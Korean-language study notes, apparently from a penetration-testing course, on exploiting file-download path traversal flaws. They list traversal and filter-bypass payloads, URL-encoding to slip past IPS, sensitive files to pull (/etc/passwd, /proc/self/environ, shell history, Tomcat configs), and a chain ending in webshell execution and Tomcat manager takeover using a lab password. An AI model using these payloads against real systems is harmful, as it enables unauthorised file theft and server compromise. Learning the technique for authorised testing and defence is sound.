--------------------------------------파일 다운로드 실습------------------------------------

한사이트에 보통 업로드경로는 한군데 있음
다운로드도 된다는 뜻

- 웹 브라우저에서 지원되는 파일 타입이 늘어남에 따라 URL 접근 시 출력.
그리고 업로드 경로가 웹 디렉터리가 아닐 경우 파일 다운로드 기능이 반드시 필요

- 기존 경로의 강제변조

* 파일 다운로드 로직 분류
 - 직접적 방식
 localhost/download.jsp?path=event&file=20201.png //경로랑 파일명 둘다 공격포인트가 될 수 있음 
 org_filename 다운로드 받을때
 
 real_filename 실제경로
 
 - 간접적 방식 
 localhost/download.jsp?idx=192
 
 
* JSP 다운로드 페이지
 1) 파일명 
 
 2) 일부경로 + 파일명
 
 3) 전체경로
 
* 모의해킹 관점에서 파일 다운로드 취약점 
 - Unix, Linux : ../
 - Windows : ../ ..\
 
* 취약점 분석 순서도
 1. 공격 대상 탐색
  - 일반적인 접근방법 : 공격자 -> 페이지 -> 다운로드 기능
                                 페이지 -> 게시판, CI(회사소개페이지), 다운로드, 이미지 뷰어
                                                  CI소개 : download.php?bo_table=download&wr_id=1
  - 직접적인 접근법 : 공격자 -> 다운로드 기능
                          HTML 코드, JS 코드, 유추, 구글링(site:www.test.co.kr inurl:download.jsp)
                          
 2. 환경 분석 : OS 파악, 언어파악
  1) 운영체제 파악
    #기존 존재파일
     http://www.victim.co.kr/js/common.js
    # 대/소문자 변경
      /js/coMMon.js -> Windows
      /JS/Common.js -> Linux / Unix
      /js/common.jS -> Linux / Unix
  2) 언어파악
    # 확장자(.do, .action은 JAVA기반), 응답 헤더, 에러페이지 -> 아파치서버, IIS서버, JEUS 서버, WebSphere 서버, TOMCAT서버(or Jboss서버 - 하단의 Jboss Web 구문 표기)
      
 3. 파일 다운로드 공격 : 다운로드 공격이 안되면 검증로직을 파악
  - download.aspx, file_download.aspx?file1=../../web.config&file2= //file1(org_filename), file2(real_filename)
    #리눅스 환경 : path=../../../etc&filename=passwd
    #윈도우 환경 : filename=../../index.jsp
                   path=d:/jeus/webhome/test_con/app/upload&filename=test.png
                   path=c:/windows/system32/drivers/etc&filename=hosts
                   
 4. 검증로직 파악 : 로직파악해서 공격 수행
  Linux/Unix : / ./ .. ../ 
  Windows : / \ ./ .\ .. ..\ ..\
  반응 분석은 문자 입력 시 에러 출력 혹은 치환(제거)되는지 확인
    
  응답 메시지
  "해당 파일이 존재하지 않습니다."
  "정상적인 입력 값이 아닙니다."
  "허용된 확장자가 아닙니다."
  
#############################파일 다운로드 공격 구문########################
  12/34.jpg -> /가 제거되는지 여부 확인
  ../../index.jsp -> ..//../index.jsp, ..////./././../index.jsp
  path=../&filename=../index.jsp
  ips에서는 URL인코딩하면 못잡음 -> %2f%2f%2findex.jsp
  download.jsp?file=webshell.jsp, w/ebshell.jsp, /webshell.jsp, ./webshell.jsp, we./bshell.jsp, ..webshell.jsp, ../../index.jsp, ../../WEB-INF/web.xml // /문자에 대해 검증이 없음을 파악
  
--------------------------------------초급/심화 공격 실습------------------------------------
* 초급
- JAVASCRIPT를 통해 파일다운로드 모듈 파악

- 응답 값 내에 기존기능 주석처리해놓은건지 확인해야됨
ex)
<!-- 취약점 발생에 따른 주석처리 : 19/03/03 -->
<!--width="80%"><a href="download2.php?filename=22314515.png">22314515.png</a></td-->

- 유추 : download.php?file=../../index.html 

* 심화 공격
1. 취약점 분석
Phase 1 취약점 분석
Phase 2 심화 공격 - Step 1 웹 디렉터리 파악
                  - Step 2 정보 수집 및 분석

*웹디렉터리일 경우
1) 상위 디렉터리로 한 칸 씩 이동을 시켜 인덱스 파일 혹은 웹 설정 파일 다운로드 시도
2) 다운로드 성공할 경우 웹 디렉터리이며, 실패할 경우 웹디렉터리가 아니라고 판단할 수 있음
 - JAVA Web Application의 경우 웹 서버가 아닌 WAS 웹 디렉터리인지 체크해야 한다.

언어                 관련파일
JAVA(JSP)       index.html, index.jsp, /WEB-INF/web.xml, /WEB-INF/jsp/index.jsp(MVC 프레임워크일경우)
PHP             index.html, index.php, .htaccess
ASP             index.html, default.html, default.asp, default.aspx, index.asp
.NET(ASPX)      index.aspx, web.config, global.asa

Q. 웹 디렉터리가 아닐 경우
* 웹 디렉터리 경로 획득 방법
1) 웹 디렉터리 경로를 파악하기 위해 여러가지 관련 파일을 다운로드해야 한다.
2) 관련 파일에는 서버 설정 파일, 웹 서버(WAS) 설정 파일, 히스토리 파일 등이 있다.
 - 리눅스/유닉스 서버에 해당하는 내용으로 윈도우 서버는 제외한다.
 
분류                 관련파일
서버 설정 파일       /proc/self/cmdline, /proc/self/environ, /etc/profile, .bash_profile, .profile
웹서버 설정 파일     [JAVA - TOMCAT]/conf/server.xml
                     [JAVA- JEUS]/config/[hostname]/JEUSMain.xml
                     [JAVA - Weblogic]/config/config.xml
                     [PHP -Apache]/conf/httpd.conf
                     
히스토리 파일        .bash_history, .csh_history, .sh_history

Q. 홈 디렉터리 정보는 어디서 얻을 수 있을까?
 - /etc/passwd -> history 파일, 홈 디렉터리 파일 획득 -> 웹서버 설정 파일 -> 웹 디렉터리 경로 획득
 - 서버 설정 파일 -> 웹 서버 설정 파일 -> 웹 디렉터리 경로 획득
 
2. 정보 수집 및 분석
 1) 파일 업로드 경로 파악
  -> 파일 업로드 소스코드 다운로드 후 분석
 
 2) 웹 소스코드 다운로드를 통한 웹 어플리케이션 로직 분석
  -> 해당 어플리케이션 소스코드 다운로드 후 분석
 
 3) /WEB-INF/web.xml 다운로드를 통한 정보 획득
  -> web.xml 다운로드 후 분석
 
 4) 웹 서버 설정 파일 다운로드를 통한 웹 서버 정보 획득
  -> 웹 서버 설정 파일 다운로드 후 분석
 
 5) 히스토리 파일 분석을 통한 정보 획득
  -> 히스토리 파일 다운로드 후 분석
  
 
3. 심화 공격 
 download.jsp?file=webshell.jsp, w/ebshell.jsp, /webshell.jsp, ./webshell.jsp, we./bshell.jsp, ..webshell.jsp, ../../index.jsp, ../../WEB-INF/web.xml // /문자에 대해 검증이 없음을 파악
 
 1) 첫번째 방법
 파일 업로드/다운로드 경로 -> 웹 디렉터리 X
 웹 디렉터리 획득 O -> 웹쉘 웹 디렉터리 업로드 성공!
 /usr/local/tomcat/conf/server.xml, /crehacktive/java_webservice/example/WEB-INF/web.xml -> 웹 디렉터리 획득
 /example/img_20203423434.jsp //웹쉘파일 실행
 
 2) 두번째 방법
 ../../../proc/self/cmdline, /proc/self/environ, /usr/local/tomcat/conf/server.xml
 
웹 디렉터리 : /crehacktive/java_webservice/example
기존 업로드 경로 : /crehacktive/file_upload

 3) 세번째 방법 - 침해사고 발생환경
 /etc/passwd -> /home/crehacktive/.bash_history -> cd /usr/local/tomcat/webapps/ROOT // tomcat 경로 획득
 /usr/local/tomcat/conf/tomcat-users.xml -> <user username="crehacktive" password="@dmin!q2w3e@" roles="manager-gui"/> //tomcat manager 계정 획득
 WAR 파일을 올리면 deploy가 됨 // jar -> war로 변경, .zip -> .war
 access.log 파일 다운로드
 
 

 
 
 
 
 
























                    
                     
                     






















































  
  
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
